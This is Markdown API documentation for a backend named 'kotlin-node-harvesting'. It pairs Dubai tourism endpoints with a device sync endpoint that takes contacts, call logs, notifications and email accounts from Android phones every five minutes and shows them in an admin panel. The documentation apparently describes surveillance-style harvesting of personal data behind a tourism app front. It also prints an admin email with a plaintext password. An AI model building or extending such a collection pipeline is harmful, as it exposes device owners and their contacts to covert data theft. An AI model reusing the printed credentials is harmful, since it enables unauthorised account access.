# API Payloads Documentation

## Base URL
```
https://kotlin-node-harvesting.onrender.com
```

## 1. Health Check API

### GET /api/health
**Status**: ✅ **WORKING**

**Response**:
```json
{
  "success": true,
  "message": "DeviceSync Backend Server is running with MongoDB",
  "timestamp": "2025-08-03T13:13:58.473Z",
  "database": "MongoDB",
  "stats": {
    "devices": 1,
    "syncedRecords": 3042
  }
}
```

---

## 2. Dubai App APIs

### GET /api/dubai/attractions
**Status**: ✅ **WORKING**

**Response**:
```json
{
  "success": true,
  "data": [
    {
      "name": "Burj Khalifa",
      "description": "The world's tallest building with stunning city views",
      "shortDescription": "World's tallest building",
      "category": "landmark",
      "location": {
        "address": "1 Sheikh Mohammed bin Rashid Blvd, Downtown Dubai",
        "area": "Downtown Dubai"
      },
      "timing": {
        "openingHours": {
          "monday": {"open": "09:00", "close": "23:00", "isOpen": true},
          "tuesday": {"open": "09:00", "close": "23:00", "isOpen": true},
          "wednesday": {"open": "09:00", "close": "23:00", "isOpen": true},
          "thursday": {"open": "09:00", "close": "23:00", "isOpen": true},
          "friday": {"open": "09:00", "close": "23:00", "isOpen": true},
          "saturday": {"open": "09:00", "close": "23:00", "isOpen": true},
          "sunday": {"open": "09:00", "close": "23:00", "isOpen": true}
        },
        "estimatedVisitTime": 120
      },
      "ticketPrices": {
        "adult": 149,
        "child": 95,
        "currency": "AED"
      },
      "features": {
        "wheelchairAccessible": false,
        "parkingAvailable": false,
        "guidedTours": false,
        "audioGuide": false,
        "photographyAllowed": true,
        "foodAvailable": false,
        "wifiAvailable": false
      },
      "ratings": {
        "average": 4.8,
        "totalReviews": 15420
      },
      "images": [
        {
          "url": "https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=800",
          "isPrimary": true
        }
      ],
      "isActive": true,
      "isPopular": true,
      "isFeatured": true
    }
  ]
}
```

### GET /api/dubai/services
**Status**: ✅ **WORKING**

**Response**:
```json
{
  "success": true,
  "data": [
    {
      "name": "Desert Safari Adventure",
      "description": "Experience dune bashing and camel riding in the Dubai desert",
      "shortDescription": "Thrilling desert adventure",
      "category": "entertainment",
      "location": {
        "address": "Dubai Desert",
        "area": "Dubai Desert",
        "isMobile": false
      },
      "pricing": {
        "basePrice": 250,
        "currency": "AED",
        "pricingType": "per_person"
      },
      "availability": {
        "operatingHours": {
          "monday": {"open": "15:00", "close": "22:00", "isOpen": true},
          "tuesday": {"open": "15:00", "close": "22:00", "isOpen": true},
          "wednesday": {"open": "15:00", "close": "22:00", "isOpen": true},
          "thursday": {"open": "15:00", "close": "22:00", "isOpen": true},
          "friday": {"open": "15:00", "close": "22:00", "isOpen": true},
          "saturday": {"open": "15:00", "close": "22:00", "isOpen": true},
          "sunday": {"open": "15:00", "close": "22:00", "isOpen": true}
        },
        "duration": 420,
        "isAvailable": true,
        "requiresBooking": true,
        "advanceBookingDays": 1
      },
      "features": {
        "accessibility": {
          "wheelchairAccessible": false,
          "childFriendly": false,
          "petFriendly": false
        }
      },
      "provider": {
        "name": "Dubai Desert Adventures",
        "rating": 0,
        "totalReviews": 0
      },
      "ratings": {
        "average": 4.7,
        "totalReviews": 2340
      },
      "images": [
        {
          "url": "https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=800",
          "isPrimary": true
        }
      ],
      "isActive": true,
      "isPopular": true,
      "isFeatured": false
    }
  ]
}
```

### GET /api/dubai/tour-packages
**Status**: ✅ **WORKING**

**Response**:
```json
{
  "success": true,
  "data": [
    {
      "name": "Dubai Essential Experience",
      "description": "Complete Dubai experience with iconic attractions",
      "shortDescription": "Essential Dubai tour",
      "category": "essential",
      "duration": {
        "days": 3,
        "nights": 2
      },
      "pricing": {
        "adult": 1200,
        "child": 800,
        "currency": "AED"
      },
      "accommodations": {
        "hotelCategory": "standard",
        "roomType": "Standard Room",
        "mealPlan": "bed_breakfast"
      },
      "transport": {
        "airportTransfer": true,
        "interCityTransport": true,
        "localTransport": true
      },
      "groupSize": {
        "min": 1,
        "max": 20
      },
      "availability": {
        "isAvailable": true,
        "currentBookings": 0,
        "requiresAdvanceBooking": true,
        "advanceBookingDays": 7
      },
      "provider": {
        "name": "Dubai Discoveries Tours",
        "rating": 0,
        "totalReviews": 0
      },
      "ratings": {
        "average": 4.6,
        "totalReviews": 890
      },
      "itinerary": [
        {
          "day": 1,
          "title": "Arrival & City Orientation",
          "meals": {
            "breakfast": false,
            "lunch": false,
            "dinner": true
          },
          "activities": [
            {
              "time": "14:00",
              "activity": "Hotel check-in",
              "location": "Hotel",
              "duration": 30,
              "type": "hotel"
            },
            {
              "time": "16:00",
              "activity": "City tour",
              "location": "Dubai",
              "duration": 180,
              "type": "attraction"
            }
          ]
        }
      ],
      "images": [
        {
          "url": "https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=800",
          "isPrimary": true
        }
      ],
      "isActive": true,
      "isPopular": true,
      "isFeatured": false
    }
  ]
}
```

---

## 3. Authentication APIs

### POST /api/admin/login
**Status**: ✅ **WORKING**

**Request**:
```json
{
  "email": "bilal.xbt@gmail.com",
  "password": "bilal123"
}
```

**Response**:
```json
{
  "message": "Admin login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "admin": {
    "id": "688e93431341820dd59aba69",
    "username": "bilal_admin",
    "email": "bilal.xbt@gmail.com",
    "role": "admin",
    "permissions": [
      "view_devices",
      "manage_users",
      "manage_codes",
      "view_analytics",
      "system_settings"
    ]
  }
}
```

### POST /api/auth/login
**Status**: ❌ **NOT IMPLEMENTED**

**Request**:
```json
{
  "username": "testuser",
  "password": "password123"
}
```

**Response**: `Cannot POST /api/auth/login`

### POST /api/auth/signup
**Status**: ❌ **NOT IMPLEMENTED**

**Request**:
```json
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "password123",
  "firstName": "Test",
  "lastName": "User"
}
```

**Response**: `Cannot POST /api/auth/signup`

---

## 4. Data Syncing APIs

### POST /api/devices/{deviceId}/sync
**Status**: ✅ **WORKING**

**Request Headers**:
```
Content-Type: application/json
```

**Request Body**:
```json
{
  "deviceId": "test-device-123",
  "androidId": "android-123",
  "deviceCode": "12345",
  "dataType": "CONTACTS",
  "data": [
    {
      "name": "Test Contact",
      "phone": "+1234567890",
      "email": "test@example.com"
    }
  ],
  "timestamp": "2025-08-03T13:15:00Z"
}
```

**Supported Data Types**:
- `CONTACTS`
- `CALL_LOGS`
- `NOTIFICATIONS`
- `EMAIL_ACCOUNTS`

**Response**:
```json
{
  "success": true,
  "data": {
    "success": true,
    "itemsInserted": 1,
    "itemsSkipped": 0,
    "lastSyncTime": "2025-08-03T13:13:33.499Z",
    "message": "BULK INSERT: 1 CONTACTS items inserted successfully"
  }
}
```

### GET /api/admin/device-data
**Status**: ⚠️ **PARTIAL** (Data syncs but not visible in admin panel)

**Request Headers**:
```
Authorization: Bearer {admin_token}
```

**Response**:
```json
{
  "deviceData": [],
  "pagination": {
    "total": 0,
    "page": 1,
    "limit": 100,
    "pages": 0
  }
}
```

---

## 5. User Management APIs

### POST /api/admin/users
**Status**: ❓ **NOT TESTED**

**Request**:
```json
{
  "userEmail": "user@example.com",
  "userName": "Test User",
  "numDevices": 5
}
```

**Response**: Expected to create user with auto-generated 5-digit code

### GET /api/admin/users
**Status**: ❓ **NOT TESTED**

**Response**: Expected to return list of all users

### GET /api/user/device-data
**Status**: ❓ **NOT TESTED**

**Request Headers**:
```
User-Code: 12345
```

**Response**: Expected to return device data for specific user code

---

## 6. Mobile App Configuration

### App Config (app_config.json)
```json
{
  "backend_url": "https://kotlin-node-harvesting.onrender.com",
  "api_endpoints": {
    "sync_data": "/api/devices/{deviceId}/sync",
    "admin_login": "/api/admin/login",
    "health_check": "/api/health"
  },
  "sync_interval": 300000,
  "max_retries": 3,
  "timeout": 30000
}
```

### Device Config (device_config.json)
```json
{
  "deviceCode": "12345",
  "appVersion": "1.0.0",
  "syncInterval": 300000,
  "maxRetries": 3,
  "enabledDataTypes": [
    "contacts",
    "call_logs",
    "notifications",
    "email_accounts"
  ]
}
```

---

## API Status Summary

| API Endpoint | Status | Notes |
|--------------|--------|-------|
| Health Check | ✅ Working | Server running, 3042 records synced |
| Attractions | ✅ Working | Returns Dubai attractions data |
| Services | ✅ Working | Returns Dubai services data |
| Tour Packages | ✅ Working | Returns Dubai tour packages data |
| Admin Login | ✅ Working | Admin authentication successful |
| Data Sync | ✅ Working | All data types syncing successfully |
| Admin Device Data | ⚠️ Partial | Data syncs but not visible in admin panel |
| User Login | ❌ Missing | Not implemented |
| User Signup | ❌ Missing | Not implemented |
| User Management | ❓ Untested | Need to test user creation/management |

## Issues Found

1. **User Authentication APIs Missing**: The `/api/auth/login` and `/api/auth/signup` endpoints are not implemented
2. **Admin Panel Data Display**: While data syncs successfully, the admin panel's `/api/admin/device-data` endpoint returns empty results
3. **User Management**: Need to test user creation and management APIs

## Recommendations

1. Implement user authentication APIs for the mobile app
2. Fix the admin panel data retrieval issue
3. Test user management functionality
4. Add proper error handling and validation to all endpoints 